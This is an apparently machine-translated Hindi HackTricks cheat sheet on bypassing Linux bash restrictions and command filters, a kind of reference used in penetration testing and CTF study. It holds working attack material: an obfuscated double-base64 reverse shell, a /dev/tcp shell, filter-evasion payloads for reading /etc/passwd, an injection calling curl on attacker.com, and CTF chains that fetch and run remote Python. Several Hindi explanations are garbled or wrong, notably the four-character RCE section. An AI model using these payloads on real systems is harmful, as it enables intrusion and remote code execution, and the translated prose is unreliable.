# लिनक्स प्रतिबंधों को दूर करें

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से बनाएं और **स्वचालित कार्यप्रवाह** को चलाएं जो दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित होता है।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## सामान्य प्रतिबंधों को दूर करना

### रिवर्स शेल
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### छोटा रिवर्स शैल
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### पथ और निषिद्ध शब्दों को अनदेखा करें

बाश रोक को अनदेखा करने के लिए निम्नलिखित तकनीकों का उपयोग करें:

#### 1. अनुमति नियंत्रण को अनदेखा करें

अगर आपको अनुमति नियंत्रण को अनदेखा करने की आवश्यकता है, तो निम्नलिखित चरणों का पालन करें:

- `chmod +x` कमांड का उपयोग करके फ़ाइल को निषिद्ध शब्दों के साथ एक्सीक्यूटेबल बनाएं।
- `./` कमांड का उपयोग करके एक्सीक्यूटेबल फ़ाइल को चलाएं।

उदाहरण:
```bash
chmod +x /path/to/file
./file
```

#### 2. अनुमति नियंत्रण को बदलें

अगर आपको अनुमति नियंत्रण को बदलने की आवश्यकता है, तो निम्नलिखित चरणों का पालन करें:

- `chown` कमांड का उपयोग करके फ़ाइल के मालिक को बदलें।
- `chmod` कमांड का उपयोग करके फ़ाइल की अनुमतियों को बदलें।

उदाहरण:
```bash
chown new_owner /path/to/file
chmod new_permissions /path/to/file
```

#### 3. अनुमति नियंत्रण को अनदेखा करें (अनुप्रयोग के साथ)

अगर आपको अनुमति नियंत्रण को अनदेखा करने की आवश्यकता है और आपके पास अनुप्रयोग है, तो निम्नलिखित चरणों का पालन करें:

- `strace` कमांड का उपयोग करके अनुप्रयोग के साथ चल रहे सिस्टम कॉल को देखें।
- निषिद्ध शब्दों को अनदेखा करने के लिए अनुप्रयोग को बदलें या उन्हें छिपाएं।

उदाहरण:
```bash
strace -e execve /path/to/application
```

इन तकनीकों का उपयोग करके आप बाश रोक को अनदेखा कर सकते हैं और निषिद्ध शब्दों और पथों को बाइपास कर सकते हैं।
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### निषिद्ध स्थानों को अनदेखा करें

अगर आपको एक निषिद्ध स्थान में जाने की आवश्यकता है, तो आप निम्नलिखित तकनीक का उपयोग करके इसे अनदेखा कर सकते हैं:

```bash
cd /tmp; cd ..
```

इस तरीके में, हम `/tmp` निर्देशिका में जाते हैं और फिर `cd ..` कमांड का उपयोग करके पिछले निर्देशिका में वापस जाते हैं। इस तरीके से, आप निषिद्ध स्थानों को आसानी से अनदेखा कर सकते हैं।
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### बैकस्लैश और स्लैश को अनदेखा करें

बैकस्लैश और स्लैश को अनदेखा करने के लिए
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### पाइप को अनदेखा करें

जब आपको बैश रेस्ट्रिक्शन के तहत पाइप का उपयोग करने की अनुमति नहीं होती है, तो आप निम्नलिखित तकनीकों का उपयोग करके पाइप को अनदेखा कर सकते हैं:

- अल्टर्नेटिव शेल का उपयोग करें: आप किसी अल्टर्नेटिव शेल (जैसे कि `zsh` या `ksh`) का उपयोग करके पाइप को अनदेखा कर सकते हैं। इसके लिए, आपको अल्टर्नेटिव शेल को खोलने के लिए निम्नलिखित कमांड का उपयोग करना होगा:

  ```bash
  $ zsh
  ```

  या

  ```bash
  $ ksh
  ```

  इसके बाद, आप पाइप का उपयोग कर सकते हैं।

- फ़ाइल रेडायरेक्शन का उपयोग करें: आप फ़ाइल रेडायरेक्शन (`<`) का उपयोग करके पाइप को अनदेखा कर सकते हैं। इसके लिए, आपको पहले डेटा को एक फ़ाइल में लिखना होगा और फिर उस फ़ाइल को उपयोग करके पाइप करना होगा। निम्नलिखित कमांड का उपयोग करें:

  ```bash
  $ echo "data" > file.txt
  $ command < file.txt
  ```

  यहां, `data` को आपकी डेटा के साथ बदल दें और `command` को आपकी कमांड के साथ बदल दें।

- टेम्प फ़ाइल का उपयोग करें: आप टेम्प फ़ाइल (`/tmp`) का उपयोग करके पाइप को अनदेखा कर सकते हैं। इसके लिए, आपको पहले डेटा को टेम्प फ़ाइल में लिखना होगा और फिर उस फ़ाइल को उपयोग करके पाइप करना होगा। निम्नलिखित कमांड का उपयोग करें:

  ```bash
  $ echo "data" > /tmp/file.txt
  $ command < /tmp/file.txt
  ```

  यहां, `data` को आपकी डेटा के साथ बदल दें और `command` को आपकी कमांड के साथ बदल दें।
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### हेक्स एनकोडिंग के साथ बाईपास करें

यदि आपको बैश प्रतिबंधों को बाईपास करने की आवश्यकता है, तो आप हेक्स एनकोडिंग का उपयोग कर सकते हैं। हेक्स एनकोडिंग के माध्यम से, आप बाईनरी डेटा को हेक्साडेसिमल नंबरों में प्रतिष्ठित कर सकते हैं। इसके बाद, आप इन हेक्साडेसिमल नंबरों को बैश शेल में प्रविष्ट कर सकते हैं। बैश शेल इनपुट को हेक्साडेसिमल नंबरों के रूप में स्वीकार करेगी और उन्हें बाइनरी डेटा में वापस बदलेगी। इस तरीके से, आप बैश प्रतिबंधों को आसानी से बाईपास कर सकते हैं।

इसके लिए, आप निम्नलिखित चरणों का पालन कर सकते हैं:

1. बाइनरी डेटा को हेक्साडेसिमल नंबरों में एनकोड करें। आप इसके लिए `xxd` उपकरण का उपयोग कर सकते हैं।

   ```
   echo -n "/bin/bash" | xxd -p
   ```

   इसका परिणाम होगा `2f62696e2f62617368`।

2. अब, आप इस हेक्साडेसिमल नंबर को बैश शेल में प्रविष्ट कर सकते हैं।

   ```
   echo -e "\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
   ```

   इससे बैश शेल में `/bin/bash` वापस बदल जाएगा।

इस तरीके का उपयोग करके, आप बैश प्रतिबंधों को बाईपास कर सकते हैं और अनुचित एक्सेस प्राप्त कर सकते हैं।
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### आईपी को अनदेखा करें

यदि आपको किसी आईपी पर प्रतिबंध लगा हुआ है और आप उसे अनदेखा करना चाहते हैं, तो निम्नलिखित तकनीकों का उपयोग करके आप इसे बाइपास कर सकते हैं:

- **IP छलावा करें**: आप आईपी छलावा करके अपनी पहचान छिपा सकते हैं। इसके लिए, आपको आईपी छलावा करने के लिए उपयोग किए जाने वाले उपकरणों का उपयोग करना होगा।

- **आईपी छिपाएं**: आप अपनी आईपी को छिपा सकते हैं और अनदेखा कर सकते हैं। इसके लिए, आप एक प्रॉक्सी सर्वर का उपयोग कर सकते हैं जो आपकी वास्तविक आईपी को छिपा देता है।

- **आईपी बदलें**: आप अपनी वास्तविक आईपी को बदलकर अनदेखा कर सकते हैं। इसके लिए, आपको एक VPN (वर्चुअल प्राइवेट नेटवर्क) सेवा का उपयोग करना होगा जो आपको एक नया आईपी प्रदान करता है।

इन तकनीकों का उपयोग करके, आप आईपी प्रतिबंध को बाइपास कर सकते हैं और अनदेखा कर सकते हैं।
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### समय आधारित डेटा निकासी

यह तकनीक उन दृष्टिगत नियंत्रणों को दुर्गम करने के लिए उपयोगी हो सकती है जो एक नेटवर्क या सिस्टम में डेटा की निकासी को रोकते हैं। इस तकनीक का उपयोग करके, हैकर डेटा को टाइमिंग या विशेष इंटरवल के आधार पर निकाल सकता है, जिससे उन्हें नियंत्रणों को चकमा देने के लिए अधिक समय मिलता है। इसके लिए, हैकर एक निर्दिष्ट समय अंतराल के बाद डेटा को छोड़ता है, जिसे उनका निर्दिष्ट सर्वर या स्थान पकड़ता है। यह तकनीक उपयोगी हो सकती है जब एक नेटवर्क या सिस्टम में डेटा की निकासी करने के लिए अनुमति नहीं है, लेकिन डेटा को छोड़ने के लिए कुछ समय की अनुमति हो सकती है।
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### एनवायरनमेंट वेरिएबल्स से चर प्राप्त करना

एक बाश स्क्रिप्ट में, हम एनवायरनमेंट वेरिएबल्स का उपयोग करके चर प्राप्त कर सकते हैं। यह तकनीक बाश की रोकथामों को दूर करने के लिए उपयोगी हो सकती है। निम्नलिखित चरों को प्राप्त करने के लिए निम्नलिखित आदेश उपयोग करें:

```bash
$ echo -n $USER
```

इस आदेश का उपयोग करके हम `$USER` एनवायरनमेंट वेरिएबल से चर प्राप्त कर सकते हैं। इसमें `-n` विकल्प का उपयोग करके नई पंक्ति के लिए नया पंक्ति नहीं बनाई जाएगी।

इसी तरह, हम अन्य एनवायरनमेंट वेरिएबल्स से चर प्राप्त कर सकते हैं। उदाहरण के लिए, `$HOME` एनवायरनमेंट वेरिएबल से वर्तमान उपयोगकर्ता का होम डायरेक्टरी प्राप्त करने के लिए निम्नलिखित आदेश का उपयोग करें:

```bash
$ echo -n $HOME
```

इस तरह, हम एनवायरनमेंट वेरिएबल्स का उपयोग करके चर प्राप्त कर सकते हैं और इसे अपनी आवश्यकतानुसार उपयोग कर सकते हैं।
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS डेटा निकालना

आप उदाहरण के लिए **burpcollab** या [**pingb**](http://pingb.in) का उपयोग कर सकते हैं।

### बिल्टइंस

यदि आप बाहरी फ़ंक्शन को नहीं चला सकते हैं और केवल **सीमित संख्या के बिल्टइंस तक पहुंच है** तो इसे प्राप्त करने के लिए कुछ उपयोगी ट्रिक्स हैं। आमतौर पर आपको **सभी बिल्टइंस का उपयोग नहीं करने की संभावना** होगी, इसलिए आपको जेल को बाइपास करने के लिए सभी विकल्पों को जानना चाहिए। [**devploit**](https://twitter.com/devploit) से विचार।\
सबसे पहले सभी [**शेल बिल्टइंस**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** की जांच करें।** फिर यहां आपके पास कुछ **सिफारिशें** हैं:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### पॉलीग्लॉट कमांड इंजेक्शन

Polyglot command injection (पॉलीग्लॉट कमांड इंजेक्शन) एक तकनीक है जिसका उपयोग बैश (Bash) रोकथामों को अनदेखा करने के लिए किया जाता है। इस तकनीक का उपयोग करके हम एक ऐसा कमांड लिख सकते हैं जो बैश द्वारा निष्पादित नहीं होगा, लेकिन अन्य शेल (Shell) या भाषाओं द्वारा निष्पादित हो सकता है। इस तरह, हम बैश रोकथामों को चकित करते हुए अनुमति प्राप्त कर सकते हैं और अनुमति प्राप्त करके उच्चारण या निष्पादन कर सकते हैं।

इस तकनीक का उपयोग करने के लिए, हम एक पॉलीग्लॉट स्ट्रिंग (Polyglot String) बनाते हैं जो बैश और अन्य शेल द्वारा समझा जा सकता है। इसके बाद, हम इस स्ट्रिंग को एक विशिष्ट संदेश (Message) के रूप में भेजते हैं, जिसे बैश निष्पादित करेगा। बैश इस संदेश को अपनी भाषा में समझेगा और उच्चारण या निष्पादन करेगा।

इस तकनीक का उपयोग करने के लिए, हम निम्नलिखित चरणों का पालन कर सकते हैं:
1. एक पॉलीग्लॉट स्ट्रिंग बनाएं जो बैश और अन्य शेल द्वारा समझा जा सकता है।
2. इस स्ट्रिंग को एक विशिष्ट संदेश के रूप में भेजें, जिसे बैश निष्पादित करेगा।
3. बैश द्वारा संदेश को समझें और उच्चारण या निष्पादन करें।

इस तकनीक का उपयोग करके, हम बैश रोकथामों को अनदेखा कर सकते हैं और अनुमति प्राप्त करके उच्चारण या निष्पादन कर सकते हैं।
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### पॉटेंशियल रेजेक्स को बाइपास करें

यदि आपको किसी बैश स्क्रिप्ट में रेजेक्सन को बाइपास करने की आवश्यकता हो, तो आप निम्नलिखित तकनीकों का उपयोग कर सकते हैं:

- विशेष वर्णों को ट्रिक करें: आप विशेष वर्णों को ट्रिक करके रेजेक्सन को बाइपास कर सकते हैं। उदाहरण के लिए, आप विशेष वर्णों को एस्केप करके उन्हें अनदेखा कर सकते हैं।

- अन्य भाषाओं का उपयोग करें: आप अन्य भाषाओं का उपयोग करके रेजेक्सन को बाइपास कर सकते हैं। उदाहरण के लिए, आप अंग्रेजी के बजाय हिंदी या अन्य भाषाओं का उपयोग कर सकते हैं।

- विशेष वर्णों को बदलें: आप विशेष वर्णों को बदलकर रेजेक्सन को बाइपास कर सकते हैं। उदाहरण के लिए, आप वर्गीकरण के लिए उपयोग होने वाले वर्णों को बदलकर उन्हें अनदेखा कर सकते हैं।

- विशेष वर्णों को छोड़ें: आप विशेष वर्णों को छोड़कर रेजेक्सन को बाइपास कर सकते हैं। उदाहरण के लिए, आप विशेष वर्णों को छोड़कर उन्हें अनदेखा कर सकते हैं।

यदि आप इन तकनीकों का उपयोग करते हैं, तो आप रेजेक्सन को बाइपास करने में सफल हो सकते हैं।
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### बैशफस्केटर

Bashfuscator एक उपकरण है जो बैश स्क्रिप्ट को अस्पष्ट बनाने के लिए उपयोग किया जाता है। यह टेक्स्ट को अदृश्य बनाने के लिए विभिन्न तकनीकों का उपयोग करता है, जैसे कि वेरिएबल नामों को बदलना, वापसी को छिपाना और कोड को अदृश्य बनाने के लिए विभिन्न ट्रिक्स का उपयोग करना। इसका उपयोग करके, एक हमलावर बैश स्क्रिप्ट को अधिक मुश्किल बनाने और उसे विश्लेषण करने के लिए अधिक समय लगाने में मदद मिलती है।

बैशफस्केटर का उपयोग करने के लिए, आपको इसे डाउनलोड करना और इंस्टॉल करना होगा। इंस्टॉलेशन के बाद, आप इसे चला सकते हैं और एक बैश स्क्रिप्ट को अस्पष्ट बनाने के लिए उपयोग कर सकते हैं। बैशफस्केटर आपको विभिन्न विकल्प प्रदान करता है, जिन्हें आप अपनी आवश्यकतानुसार चुन सकते हैं। इसके बाद, आपको अस्पष्ट बनाए गए स्क्रिप्ट को चलाने के लिए नया बैश सेशन शुरू करना होगा।

बैशफस्केटर एक उपयोगी उपकरण है जो बैश स्क्रिप्ट को अस्पष्ट बनाने में मदद करता है और इसे विश्लेषण करने को कठिन बनाता है। यह एक अत्यंत उपयोगी तकनीक है जो हमलावरों के खिलाफ सुरक्षा को मजबूत करने में मदद कर सकती है।
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5 अक्षरों के साथ RCE

बहुत सारे बैश रोकों को दूर करने के लिए, आपको एक छोटे से शब्द का उपयोग करके रिमोट कोड एक्सीक्यूशन (RCE) को बाइपास करने की आवश्यकता हो सकती है। यहां हम आपको 5 अक्षरों के साथ RCE करने के लिए कुछ उपयोगी तकनीकें बता रहे हैं:

1. **बैकटिक्स का उपयोग करें**: आप बैकटिक्स (`) का उपयोग करके RCE को बाइपास कर सकते हैं। इसके लिए, आपको निम्नलिखित कमांड का उपयोग करना होगा:

```bash
`id`
```

2. **विशेषाधिकार बदलें**: आप विशेषाधिकारों को बदलकर RCE को बाइपास कर सकते हैं। इसके लिए, आपको निम्नलिखित कमांड का उपयोग करना होगा:

```bash
sudo -u#-1 id
```

3. **विशेषाधिकार बदलें (अन्य उपयोगकर्ता)**: आप अन्य उपयोगकर्ता के रूप में विशेषाधिकारों को बदलकर RCE को बाइपास कर सकते हैं। इसके लिए, आपको निम्नलिखित कमांड का उपयोग करना होगा:

```bash
sudo -u username id
```

यहां आपको 5 अक्षरों के साथ RCE करने के लिए कुछ उपयोगी तकनीकें दी गई हैं। आप इन्हें अपनी आवश्यकताओं के अनुसार उपयोग कर सकते हैं।
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4 अक्षरों के साथ RCE

बहुत सारे लिनक्स डिस्ट्रीब्यूशन में, आपको एक शेल कमांड चलाने के लिए बश रेस्ट्रिक्शन को दूर करने की आवश्यकता हो सकती है। इसके लिए, आपको एक बश स्क्रिप्ट को बनाने की आवश्यकता होगी जो आपको शेल एक्सीक्यूशन की अनुमति देगा। यहां हम एक ऐसा तरीका देखेंगे जिसमें आपको केवल 4 अक्षरों की आवश्यकता होगी।

आपको निम्नलिखित बश स्क्रिप्ट को बनाना होगा:

```bash
$ echo $0
```

इसे एक फ़ाइल में सहेजें, उदाहरण के लिए `script.sh`।

फिर इसे चलाएं:

```bash
$ . script.sh
```

इससे आपको अपने वर्तमान शेल का नाम मिलेगा। अब आप इस नाम का उपयोग करके शेल कमांड चला सकते हैं:

```bash
$ /bin/bash
```

इससे आपको नई शेल मिलेगी जिसमें आपको पूरी अधिकारिकता मिलेगी।

यह तकनीक बश रेस्ट्रिक्शन को दूर करने के लिए एक छोटा और आसान तरीका है, लेकिन इसका उपयोग केवल उद्योग में अनुमति प्राप्त किया जाने वाले सिस्टमों पर करें।
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## रीड-ओनली/नोएक्सेक/डिस्ट्रोलेस बाइपास

यदि आप **रीड-ओनली और नोएक्सेक सुरक्षाओं** वाले फ़ाइल सिस्टम में हैं या फिर एक डिस्ट्रोलेस कंटेनर में हैं, तो फिर भी तरीके हैं **अनियमित बाइनरी को चलाने के लिए, यहां तक कि एक शैल भी!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot और अन्य जेल्स बाइपास

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## संदर्भ और अधिक

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से बनाएं और **स्वचालित कार्यप्रवाह** बनाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होता है।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को पीडीएफ़ में डाउनलोड** करने का उपयोग करना चाहते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
